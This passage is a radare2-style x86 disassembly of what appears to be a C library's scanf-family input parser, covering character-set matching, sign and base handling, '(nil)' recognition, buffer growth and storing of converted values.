mov eax, dword [var_ech]
mov edx, dword [var_9ch]
movzx ecx, byte [var_b8h]
cmp byte [edx + eax], cl
je 0x8070908
test byte [var_a4h], 8
jne 0x80707b0
mov ecx, dword [var_d4h]
mov byte [ecx], dl
inc ecx
test dword [var_a4h], 0x100
mov dword [var_d4h], ecx
je 0x80707b0
mov edx, dword [var_dch]
mov eax, dword [var_e0h]
add eax, dword [edx]
cmp ecx, eax
je 0x8070894
dec dword [var_a0h]
mov ebx, dword [var_a0h]
test ebx, ebx
jle 0x8070808
cmp dword [var_9ch], 0xffffffff
je 0x8070882
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x807086f
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x8070860
inc dword [var_98h]
cmp dword [var_9ch], 0xffffffff
jne 0x807075a
cmp esi, dword [var_98h]
je case.0x806fb57.38
test byte [var_a4h], 8
jne 0x806f69c
mov ecx, dword [var_d4h]
mov byte [ecx], 0
inc ecx
test dword [var_a4h], 0x100
mov dword [var_d4h], ecx
je 0x806fdb2
mov edx, dword [var_dch]
mov eax, ecx
sub eax, dword [edx]
cmp eax, dword [var_e0h]
je 0x806fdb2
mov dword [var_4h], eax
jmp 0x80700cd
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x80707fb
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x80707ec
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
jmp 0x8070808
mov ebx, dword [var_e0h]
add ebx, ebx
mov ecx, dword [var_dch]
mov dword [var_4h], ebx
mov eax, dword [ecx]
mov dword [esp], eax
call fcn.08051220
test eax, eax
mov dword [var_d4h], eax
jne 0x80708e1
mov eax, dword [var_e0h]
inc eax
cmp ebx, eax
jbe 0x80708c9
mov ebx, eax
jmp 0x807089c
mov edx, dword [var_dch]
mov ecx, dword [var_e0h]
mov eax, dword [edx]
mov byte [ecx + eax - 1], 0
jmp 0x80701d4
mov edx, dword [var_d4h]
mov ecx, dword [var_e0h]
mov dword [var_e0h], ebx
mov eax, dword [var_dch]
mov dword [eax], edx
add edx, ecx
mov dword [var_d4h], edx
jmp 0x80707b0
movzx eax, byte [var_9ch]
mov ecx, dword [arg_8h]
dec dword [var_98h]
mov dword [esp], ecx
mov dword [var_4h], eax
call fcn.0804e190
jmp 0x8070808
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x807074d
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x807073a
call fcn.08048b20
mov ecx, dword [var_b4h]
mov dword [eax], ecx
jmp 0x806f8c6
mov eax, dword [var_90h_2]
movzx ebx, byte [eax]
test bl, bl
je 0x80703c2
cmp bl, 0x5d
je 0x80703c2
movzx eax, byte [eax - 2]
cmp al, bl
ja 0x80703c2
mov edx, eax
jae 0x80703d8
mov ecx, dword [var_ech_2]
movzx eax, dl
inc edx
mov byte [eax + ecx], 1
mov eax, dword [var_90h_2]
movzx ebx, byte [eax]
cmp dl, bl
jb 0x807098e
jmp 0x80703d8
mov edx, dword [var_ech]
movzx eax, bl
mov byte [eax + edx], 1
inc dword [var_90h]
mov ecx, dword [var_90h]
movzx ebx, byte [ecx]
jmp 0x80703a4
inc ecx
mov byte [var_b8h], 1
mov dword [var_90h], ecx
jmp 0x8070328
mov edx, dword [var_fch_2]
mov eax, dword [var_sp_ch]
dec edx
je 0x80702ca
add eax, 4
dec edx
jne 0x80709f2
jmp 0x80702ca
mov ecx, dword [var_fch_2]
test ecx, ecx
jne 0x8070a1b
mov eax, dword [var_8ch_2]
add dword [var_8ch_2], 4
mov eax, dword [eax]
jmp 0x80702fe
mov edx, dword [var_fch_2]
mov eax, dword [var_sp_ch]
dec edx
je 0x8070a14
add eax, 4
dec edx
jne 0x8070a27
jmp 0x8070a14
test byte [var_a4h], 8
jne 0x8070312
test dword [var_a4h_2], 0x100
je 0x8070aba
mov eax, dword [var_fch_2]
test eax, eax
jne 0x8070aa6
mov eax, dword [var_8ch_2]
add dword [var_8ch_2], 4
mov eax, dword [eax]
mov dword [var_dch_2], eax
mov eax, dword [var_dch_2]
test eax, eax
je case.0x806fb57.38
mov dword [var_e0h_2], 0x64
mov dword [esp], 0x64
call fcn.08050fe0
mov edx, dword [var_dch_2]
mov dword [edx], eax
mov dword [var_d4h_2], eax
mov eax, dword [var_d4h_2]
test eax, eax
jmp 0x807030c
mov edx, dword [var_fch_2]
mov eax, dword [var_sp_ch]
dec edx
je 0x8070a5f
add eax, 4
dec edx
jne 0x8070ab2
jmp 0x8070a5f
mov eax, dword [var_fch_2]
test eax, eax
jne 0x8070ad5
mov eax, dword [var_8ch_2]
add dword [var_8ch_2], 4
mov eax, dword [eax]
jmp 0x8070a93
mov edx, dword [var_fch_2]
mov eax, dword [var_sp_ch]
dec edx
je 0x8070ad1
add eax, 4
dec edx
jne 0x8070ae1
jmp 0x8070ad1
test byte [var_a4h_2], 1
jne case.0x806fb57.67
test byte [var_a4h_2], 8
jne 0x8070b30
mov esi, dword [var_fch_2]
test esi, esi
jne 0x8070cf8
mov eax, dword [var_8ch_2]
add dword [var_8ch_2], 4
mov eax, dword [eax]
mov dword [var_d4h_2], eax
mov ebx, dword [var_d4h_2]
test ebx, ebx
je case.0x806fb57.38
cmp dword [var_9ch_2], 0xffffffff
je 0x8070ce1
mov ecx, dword [var_4h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8070cce
movzx edx, byte [eax]
mov ecx, dword [var_4h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch_2], edx
cmp dword [var_9ch_2], 0xffffffff
je 0x8070cbc
inc dword [var_98h_2]
mov eax, dword [var_9ch_2]
mov dword [var_9ch_2], eax
inc eax
je 0x806f8c6
cmp dword [var_a0h_2], 0xffffffff
mov eax, 1
cmovne eax, dword [var_a0h_2]
test byte [var_a4h_2], 8
mov dword [var_a0h_2], eax
jne 0x8070c44
movzx ecx, byte [var_9ch_2]
mov eax, dword [var_d4h_2]
mov byte [eax], cl
dec dword [var_a0h_2]
inc eax
mov ecx, dword [var_a0h_2]
mov dword [var_d4h_2], eax
test ecx, ecx
jle 0x806fda5
cmp dword [var_9ch_2], 0xffffffff
je 0x8070c32
mov edx, dword [var_4h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x8070c22
movzx ecx, byte [eax]
mov edx, dword [var_4h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch_2], ecx
cmp dword [var_9ch_2], 0xffffffff
je 0x8070c13
inc dword [var_98h_2]
cmp dword [var_9ch_2], 0xffffffff
jne 0x8070ba8
jmp 0x806fda5
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h_2], eax
jmp 0x8070c05
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch_2], eax
jmp 0x8070bf6
call fcn.08048b20
mov edx, dword [var_b4h_2]
mov dword [eax], edx
jmp 0x806fda5
dec dword [var_a0h_2]
mov edx, dword [var_a0h_2]
test edx, edx
jle 0x806fda5
cmp dword [var_9ch_2], 0xffffffff
je 0x806fddc
mov edx, dword [var_4h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x8070cac
movzx ecx, byte [eax]
mov edx, dword [var_4h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch_2], ecx
cmp dword [var_9ch_2], 0xffffffff
je 0x8070c9d
inc dword [var_98h_2]
cmp dword [var_9ch_2], 0xffffffff
jne 0x8070c44
jmp 0x806fda5
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h_2], eax
jmp 0x8070c8f
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch_2], eax
jmp 0x8070c80
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h_2], eax
jmp 0x8070b6f
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch_2], eax
jmp 0x8070b5c
call fcn.08048b20
mov edx, dword [var_b4h_2]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x8070b75
mov edx, dword [var_fch_2]
mov eax, dword [var_sp_ch]
dec edx
je 0x8070b1a
add eax, 4
dec edx
jne 0x8070d08
jmp 0x8070b1a
mov dword [var_bch_2], 0xa
mov dword [var_c0h_2], 1
cmp dword [var_9ch], 0xffffffff
je 0x8072329
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8072316
movzx edx, byte [eax]
mov ecx, dword [arg_8h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch], edx
cmp dword [var_9ch], 0xffffffff
je 0x8072304
inc dword [var_98h]
mov ebx, dword [var_9ch]
cmp ebx, 0xffffffff
mov dword [var_9ch], ebx
je 0x806f8c6
cmp dword [var_9ch], 0x2d
je 0x8072210
cmp dword [var_9ch], 0x2b
je 0x8072210
mov eax, dword [var_a0h]
test eax, eax
je 0x8070dac
cmp dword [var_9ch], 0x30
je 0x8071fef
mov ebx, dword [var_bch]
mov eax, 0xa
test ebx, ebx
cmovne eax, dword [var_bch]
mov dword [var_bch], eax
cmp dword [var_bch], 0xa
je 0x8071840
cmp dword [var_9ch], 0xffffffff
je 0x8070f3b
mov ebx, dword [var_a0h]
test ebx, ebx
je 0x8070f3b
cmp dword [var_bch], 0x10
je 0x807181b
mov eax, dword [var_9ch]
sub eax, 0x30
cmp eax, 9
ja 0x8070e15
cmp eax, dword [var_bch]
jl 0x8070e95
cmp dword [var_bch], 0xa
jne 0x8070f3b
test byte [var_a4h], 0x80
je 0x8070f3b
mov ecx, dword [var_c8h]
test ecx, ecx
je 0x8070f3b
mov edx, dword [var_a0h]
mov ebx, dword [var_c8h]
mov esi, 0x7fffffff
test edx, edx
movzx edx, byte [ebx]
cmovg esi, dword [var_a0h]
movzx eax, dl
cmp eax, dword [var_9ch]
je 0x80716db
mov eax, dword [var_c8h]
movzx edx, byte [eax]
test dl, dl
jne 0x8071662
mov eax, dword [var_a0h]
test eax, eax
cmovle esi, dword [var_a0h]
dec dword [var_f4h]
mov dword [var_a0h], esi
mov eax, dword [var_f0h]
cmp dword [var_f4h], eax
je 0x8071604
movzx edx, byte [var_9ch]
mov eax, dword [var_f4h]
mov ecx, dword [var_ech]
mov byte [eax + ecx], dl
inc eax
mov dword [var_f4h], eax
mov eax, dword [var_a0h]
dec eax
cmp dword [var_a0h], 1
cmovl eax, dword [var_a0h]
cmp dword [var_9ch], 0xffffffff
mov dword [var_a0h], eax
je 0x80715ed
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x80715da
movzx edx, byte [eax]
mov ecx, dword [arg_8h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch], edx
cmp dword [var_9ch], 0xffffffff
je 0x80715c8
inc dword [var_98h]
mov eax, dword [var_9ch]
mov dword [var_9ch], eax
inc eax
je 0x8070f3b
mov eax, dword [var_a0h]
test eax, eax
jne 0x8070dee
mov eax, dword [var_f4h]
test eax, eax
je 0x8071308
cmp dword [var_f4h], 1
je 0x80712ea
cmp dword [var_9ch], 0xffffffff
je 0x8070f7b
movzx eax, byte [var_9ch]
mov edx, dword [arg_8h]
dec dword [var_98h]
mov dword [esp], edx
mov dword [var_4h_2], eax
call fcn.0804e190
mov ecx, dword [var_f0h]
cmp dword [var_f4h], ecx
je 0x8071295
mov eax, dword [var_ech]
mov edx, dword [var_f4h]
mov byte [edx + eax], 0
test byte [var_a4h], 2
je 0x8071222
mov eax, dword [var_c0h]
test eax, eax
je 0x80711ef
mov eax, dword [var_a4h]
mov ecx, dword [var_bch]
and eax, 0x80
mov dword [var_8h_2], ecx
mov dword [esp + 0xc], eax
lea eax, [var_80h]
mov dword [var_4h_2], eax
mov eax, dword [var_ech]
mov dword [esp], eax
call fcn.08085000
mov dword [var_d0h], eax
mov dword [var_cch], edx
mov edx, dword [var_ech]
cmp edx, dword [var_80h]
je case.0x806fb57.38
test byte [var_a4h], 8
jne 0x806f69c
mov edi, dword [ebp - 0xc0]
test edi, edi
jne 0x807112d
test byte [ebp - 0xa4], 2
je 0x8071068
mov esi, dword [ebp - 0xfc]
test esi, esi
je 0x8071059
mov edx, dword [ebp - 0xfc]
mov eax, dword [ebp + 0x10]
dec edx
je 0x8071041
add eax, 4
dec edx
jne 0x807103b
mov eax, dword [eax]
mov edx, dword [ebp - 0xd0]
mov ecx, dword [ebp - 0xcc]
mov dword [eax], edx
mov dword [eax + 4], ecx
jmp 0x806fdb2
mov eax, dword [ebp - 0x8c]
add dword [ebp - 0x8c], 4
jmp 0x8071041
test byte [ebp - 0xa4], 4
je 0x80710ac
mov ebx, dword [ebp - 0xfc]
test ebx, ebx
je 0x807109d
mov edx, dword [ebp - 0xfc]
mov eax, dword [ebp + 0x10]
dec edx
je 0x807108d
add eax, 4
dec edx
jne 0x8071087
mov eax, dword [eax]
mov ecx, dword [ebp - 0xd0]
mov word [eax], cx
jmp 0x806fdb2
mov eax, dword [ebp - 0x8c]
add dword [ebp - 0x8c], 4
jmp 0x807108d
test dword [ebp - 0xa4], 0x200
jne 0x80710f2
mov ecx, dword [ebp - 0xfc]
test ecx, ecx
je 0x80710e3
mov edx, dword [ebp - 0xfc]
mov eax, dword [ebp + 0x10]
dec edx
je 0x80710d4
add eax, 4
dec edx
jne 0x80710ce
mov eax, dword [eax]
mov edx, dword [ebp - 0xd0]
mov dword [eax], edx
jmp 0x806fdb2
mov eax, dword [ebp - 0x8c]
add dword [ebp - 0x8c], 4
jmp 0x80710d4
mov edx, dword [ebp - 0xfc]
test edx, edx
je 0x807111e
mov edx, dword [ebp - 0xfc]
mov eax, dword [ebp + 0x10]
dec edx
je 0x807110e
add eax, 4
dec edx
jne 0x8071108
movzx ecx, byte [ebp - 0xd0]
mov eax, dword [eax]
mov byte [eax], cl
jmp 0x806fdb2
mov eax, dword [ebp - 0x8c]
add dword [ebp - 0x8c], 4
jmp 0x807110e
test byte [ebp - 0xa4], 2
je 0x807115f
mov eax, dword [ebp - 0xfc]
test eax, eax
je 0x8071059
mov edx, dword [ebp - 0xfc]
mov eax, dword [ebp + 0x10]
dec edx
je 0x8071041
add eax, 4
dec edx
jne 0x8071154
jmp 0x8071041
test byte [ebp - 0xa4], 4
je 0x8071191
mov eax, dword [ebp - 0xfc]
test eax, eax
je 0x807109d
mov edx, dword [ebp - 0xfc]
mov eax, dword [ebp + 0x10]
dec edx
je 0x807108d
add eax, 4
dec edx
jne 0x8071186
jmp 0x807108d
test dword [ebp - 0xa4], 0x200
jne 0x80711c6
mov eax, dword [ebp - 0xfc]
test eax, eax
je 0x80710e3
mov edx, dword [ebp - 0xfc]
mov eax, dword [ebp + 0x10]
dec edx
je 0x80710d4
add eax, 4
dec edx
jne 0x80711bb
jmp 0x80710d4
mov eax, dword [ebp - 0xfc]
test eax, eax
je 0x807111e
mov edx, dword [ebp - 0xfc]
mov eax, dword [ebp + 0x10]
dec edx
je 0x807110e
add eax, 4
dec edx
jne 0x80711e4
jmp 0x807110e
mov eax, dword [var_a4h]
mov edx, dword [var_bch]
mov ecx, dword [var_ech]
and eax, 0x80
mov dword [var_8h_2], edx
mov dword [esp + 0xc], eax
mov dword [esp], ecx
lea eax, [var_80h]
mov dword [var_4h_2], eax
call fcn.080850c0
jmp 0x8070fe6
mov eax, dword [var_c0h]
test eax, eax
je 0x8071265
mov eax, dword [var_a4h]
mov edx, dword [var_ech]
and eax, 0x80
mov dword [esp], edx
mov dword [esp + 0xc], eax
mov eax, dword [var_bch]
mov dword [var_8h_2], eax
lea eax, [var_80h]
mov dword [var_4h_2], eax
call fcn.080494c0
mov dword [var_d0h], eax
jmp 0x8070ff2
mov eax, dword [var_a4h]
mov ecx, dword [var_bch]
and eax, 0x80
mov dword [var_8h_2], ecx
mov dword [esp + 0xc], eax
lea eax, [var_80h]
mov dword [var_4h_2], eax
mov eax, dword [var_ech]
mov dword [esp], eax
call fcn.08063780
jmp 0x807125a
add ecx, ecx
mov eax, 0x100
mov edx, dword [var_ech]
cmp ecx, 0xff
cmova eax, ecx
mov dword [var_f0h], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea eax, [var_1fh]
and eax, 0xfffffff0
test edx, edx
mov dword [var_ech], eax
je 0x8070f8d
mov ecx, dword [var_f4h]
mov dword [var_4h_2], edx
mov dword [esp], eax
mov dword [var_8h_2], ecx
call fcn.08053770
jmp 0x8070f8d
mov edx, dword [var_ech]
movzx eax, byte [edx]
cmp al, 0x2b
je 0x806f898
cmp al, 0x2d
jne 0x8070f56
jmp 0x806f898
mov eax, dword [var_e8h]
test eax, eax
je 0x806f898
cmp dword [var_9ch], 0x28
jne 0x806f898
mov edx, dword [arg_8h]
mov ecx, dword [var_ach]
mov eax, dword [edx + 4]
mov ebx, dword [ecx + 0x38]
cmp eax, dword [edx + 8]
jae 0x80715b5
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x80715a3
inc dword [var_98h]
movzx eax, byte [var_9ch]
cmp dword [ebx + eax*4], 0x6e
jne 0x806f898
cmp dword [var_9ch], 0xffffffff
mov ecx, dword [var_ach]
mov ebx, dword [ecx + 0x38]
je 0x807158b
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8071578
movzx edx, byte [eax]
mov ecx, dword [arg_8h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch], edx
cmp dword [var_9ch], 0xffffffff
je 0x8071566
inc dword [ebp - 0x98]
movzx eax, byte [ebp - 0x9c]
lea eax, [ebx + eax*4]
cmp dword [eax], 0x69
jne 0x806f898
cmp dword [ebp - 0x9c], 0xffffffff
mov eax, dword [ebp - 0xac]
mov ebx, dword [eax + 0x38]
je 0x807154e
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x807153b
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8071529
inc dword [ebp - 0x98]
movzx eax, byte [ebp - 0x9c]
lea eax, [ebx + eax*4]
cmp dword [eax], 0x6c
jne 0x806f898
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8071517
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8071504
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x80714f2
inc dword [ebp - 0x98]
cmp dword [ebp - 0x9c], 0x29
jne 0x806f898
mov eax, dword [ebp - 0xf0]
cmp dword [ebp - 0xf4], eax
je 0x807149b
mov ecx, dword [ebp - 0xf4]
mov edx, dword [ebp - 0xec]
mov byte [ecx + edx], 0x30
inc ecx
mov dword [ebp - 0xf4], ecx
jmp 0x8070f7b
add eax, eax
mov edx, dword [ebp - 0xec]
cmp eax, 0xff
mov dword [ebp - 0xf0], eax
mov eax, 0x100
cmova eax, dword [ebp - 0xf0]
mov dword [ebp - 0xf0], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [esp + 0x1f]
and ecx, 0xfffffff0
test edx, edx
mov dword [ebp - 0xec], ecx
je 0x807147f
mov eax, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], ecx
mov dword [esp + 8], eax
call fcn.08053770
jmp 0x807147f
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x8071464
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x8071451
call fcn.08048b20
mov edx, dword [ebp - 0xb4]
mov dword [eax], edx
jmp 0x806f898
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x8071412
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x80713ff
call fcn.08048b20
mov edx, dword [ebp - 0xb4]
mov dword [eax], edx
lea eax, [ebx + 0x3fc]
jmp 0x807141c
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x80713b7
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x80713a4
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
lea eax, [ebx + 0x3fc]
jmp 0x80713c1
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x807135e
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x807134b
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x8070f1e
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x8070f0b
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x8070f24
add eax, eax
mov edx, dword [var_ech]
cmp eax, 0xff
mov dword [var_f0h], eax
mov eax, 0x100
cmova eax, dword [var_f0h]
mov dword [var_f0h], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [var_1fh]
and ecx, 0xfffffff0
test edx, edx
mov dword [var_ech], ecx
je 0x8070ea7
mov eax, dword [var_f4h]
mov dword [var_4h_2], edx
mov dword [esp], ecx
mov dword [var_8h_2], eax
call fcn.08053770
jmp 0x8070ea7
cmp ebx, dword [var_c8h]
jbe 0x8070f3b
mov eax, ebx
sub eax, dword [var_c8h]
sub dword [var_f4h], eax
cmp dword [var_9ch], 0xffffffff
je 0x80716a1
movzx eax, byte [ebp - 0x9c]
mov edx, dword [ebp + 8]
dec dword [ebp - 0x98]
mov dword [esp], edx
mov dword [esp + 4], eax
call fcn.0804e190
dec ebx
cmp ebx, dword [ebp - 0xc8]
ja 0x80716b8
movzx ebx, byte [ebx]
mov dword [ebp - 0x9c], ebx
jmp 0x8070f3b
dec dword [ebp - 0x98]
mov ecx, dword [ebp + 8]
movzx eax, byte [ebx]
dec ebx
mov dword [esp], ecx
mov dword [esp + 4], eax
call fcn.0804e190
cmp ebx, dword [ebp - 0xc8]
ja 0x80716b8
jmp 0x80716aa
test esi, esi
jle 0x8070e72
mov eax, dword [var_f0h]
cmp dword [var_f4h], eax
je 0x80717bd
movzx edx, byte [var_9ch]
mov eax, dword [var_f4h]
inc ebx
mov ecx, dword [var_ech]
mov byte [eax + ecx], dl
inc eax
mov dword [var_f4h], eax
cmp byte [ebx], 0
je 0x8070e7a
cmp dword [ebp - 0x9c], 0xffffffff
je 0x80717a9
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8071799
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x807178a
inc dword [ebp - 0x98]
mov eax, dword [ebp - 0x9c]
mov dword [ebp - 0x9c], eax
inc eax
je 0x8071782
movzx edx, byte [ebx]
dec esi
movzx eax, dl
cmp eax, dword [ebp - 0x9c]
jne 0x8070e72
test esi, esi
jg 0x80716e3
jmp 0x8070e72
movzx edx, byte [ebx]
jmp 0x8070e72
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x8071753
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x8071744
call fcn.08048b20
mov edx, dword [ebp - 0xb4]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x8071759
add eax, eax
mov edx, dword [var_ech]
cmp eax, 0xff
mov dword [var_f0h], eax
mov eax, 0x100
cmova eax, dword [var_f0h]
mov dword [var_f0h], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [var_1fh]
and ecx, 0xfffffff0
test edx, edx
mov dword [var_ech], ecx
je 0x80716f5
mov eax, dword [var_f4h]
mov dword [var_4h_2], edx
mov dword [esp], ecx
mov dword [var_8h_2], eax
call fcn.08053770
jmp 0x80716f5
mov edx, dword [var_ach]
mov ecx, dword [var_9ch]
mov eax, dword [edx + 0x34]
test byte [eax + ecx*2 + 1], 0x10
jne 0x8070e95
jmp 0x8070f3b
lea esi, [esi]
test dword [var_a4h], 0x400
je 0x8070dd3
mov eax, dword [var_b0h]
mov dword [var_100h], 0
mov edx, dword [eax + 0x70]
dec edx
cmp dword [var_9ch], 0xffffffff
mov dword [var_104h], edx
je 0x8070f3b
mov ecx, dword [var_a0h]
test ecx, ecx
je 0x8070f3b
mov dword [var_108h], 0
mov edx, dword [var_a0h]
mov ecx, dword [var_108h]
mov edi, 0x7fffffff
test edx, edx
mov edx, dword [var_b0h]
cmovg edi, dword [var_a0h]
mov eax, dword [edx + ecx*4 + 0x74]
mov dword [ebp + ecx*4 - 0x4c], eax
mov eax, dword [var_100h]
test eax, eax
jle 0x80718ef
mov esi, dword [var_100h]
mov ecx, dword [var_108h]
mov dword [var_4h_2], 0
mov eax, dword [ebp + ecx*4 - 0x4c]
mov dword [esp], eax
call fcn.080537a0
mov edx, dword [var_108h]
inc eax
dec esi
mov dword [ebp + edx*4 - 0x4c], eax
jne 0x80718c7
mov ecx, dword [var_108h]
mov ebx, dword [ebp + ecx*4 - 0x4c]
movzx edx, byte [ebx]
movzx eax, dl
cmp eax, dword [var_9ch]
je 0x8071f41
test dl, dl
je 0x8071f1b
mov edx, dword [var_108h]
mov eax, dword [ebp + edx*4 - 0x4c]
cmp ebx, eax
jbe 0x8071962
cmp dword [var_9ch], 0xffffffff
je 0x8071950
movzx eax, byte [var_9ch]
mov ecx, dword [arg_8h]
dec dword [var_98h]
mov dword [esp], ecx
mov dword [var_4h_2], eax
call fcn.0804e190
mov edx, dword [var_108h]
mov eax, dword [ebp + edx*4 - 0x4c]
dec ebx
cmp ebx, eax
ja 0x8071eef
movzx ebx, byte [ebx]
mov dword [var_9ch], ebx
mov dword [var_4h_2], 0
mov dword [esp], eax
call fcn.080537a0
mov ecx, dword [var_108h]
inc eax
mov dword [ebp + ecx*4 - 0x4c], eax
inc ecx
cmp ecx, 9
mov dword [var_108h], ecx
jle 0x807188f
cmp dword [var_108h], 0xa
je 0x8071d13
cmp dword [var_108h], 9
jg 0x8071aea
mov eax, dword [var_108h]
add eax, 0x30
mov dword [var_9ch], eax
mov eax, dword [var_f0h]
cmp dword [var_f4h], eax
je 0x8071a8c
movzx edx, byte [var_9ch]
mov eax, dword [var_f4h]
mov ecx, dword [var_ech]
mov byte [eax + ecx], dl
inc eax
mov dword [var_f4h], eax
mov eax, dword [var_a0h]
dec eax
cmp dword [var_a0h], 1
cmovl eax, dword [var_a0h]
cmp dword [var_9ch], 0xffffffff
mov dword [var_a0h], eax
je 0x8071a78
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8071a68
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8071a59
inc dword [ebp - 0x98]
mov eax, dword [ebp - 0x9c]
mov dword [ebp - 0x9c], eax
inc eax
je 0x8070f3b
mov esi, dword [ebp - 0xa0]
test esi, esi
jne 0x8071885
jmp 0x8070f3b
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x8071a33
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x8071a24
call fcn.08048b20
mov edx, dword [ebp - 0xb4]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x8071a39
add eax, eax
mov edx, dword [var_ech]
cmp eax, 0xff
mov dword [var_f0h], eax
mov eax, 0x100
cmova eax, dword [var_f0h]
mov dword [var_f0h], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [var_1fh]
and ecx, 0xfffffff0
test edx, edx
mov dword [var_ech], ecx
je 0x80719c8
mov eax, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], ecx
mov dword [esp + 8], eax
call fcn.08053770
jmp 0x80719c8
test byte [var_a4h], 0x80
je 0x8070f3b
mov eax, dword [var_c8h]
test eax, eax
je 0x8070f3b
mov ebx, dword [ebp - 0xc8]
mov eax, dword [ebp - 0xa0]
mov esi, 0x7fffffff
movzx edx, byte [ebx]
test eax, eax
cmovg esi, dword [ebp - 0xa0]
movzx eax, dl
cmp eax, dword [ebp - 0x9c]
je 0x8071bd0
mov eax, dword [ebp - 0xc8]
movzx edx, byte [eax]
test dl, dl
jne 0x8071b5e
mov edi, dword [ebp - 0xa0]
test edi, edi
cmovle esi, dword [ebp - 0xa0]
dec dword [ebp - 0xf4]
mov dword [ebp - 0xa0], esi
jmp 0x80719b6
cmp ebx, dword [ebp - 0xc8]
jbe 0x8070f3b
mov eax, ebx
sub eax, dword [ebp - 0xc8]
sub dword [ebp - 0xf4], eax
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8071b9d
movzx eax, byte [ebp - 0x9c]
mov edx, dword [ebp + 8]
dec dword [ebp - 0x98]
mov dword [esp], edx
mov dword [esp + 4], eax
call fcn.0804e190
dec ebx
cmp ebx, dword [ebp - 0xc8]
jbe 0x80716aa
dec dword [ebp - 0x98]
mov ecx, dword [ebp + 8]
movzx eax, byte [ebx]
dec ebx
mov dword [esp], ecx
mov dword [esp + 4], eax
